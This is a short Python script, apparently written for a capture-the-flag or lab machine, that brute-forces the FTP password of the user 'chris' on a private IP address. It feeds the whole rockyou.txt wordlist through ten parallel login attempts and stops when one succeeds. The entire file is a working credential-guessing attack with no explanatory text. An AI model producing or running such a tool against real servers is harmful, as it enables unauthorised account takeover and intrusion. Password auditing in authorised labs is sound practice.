from ftplib import FTP, error_perm
from concurrent.futures import ThreadPoolExecutor

host = '10.10.216.171'
username = 'chris'

def try_login(password):
    pw = password.strip()
    try:
        ftp = FTP(host)
        ftp.login(user=username, passwd=pw)
        print(f'Login successful: {username}:{pw}')
        ftp.quit()
        return True
    except error_perm:
        print(f' Failed: {username}:{pw}')
        return False

with open(r'rockyou.txt', encoding='latin-1') as f:
    passwords = f.read().splitlines()

with ThreadPoolExecutor(max_workers=10) as executor:
    for success in executor.map(try_login, passwords):
        if success:
            executor.shutdown(wait=False, cancel_futures=True)
            break
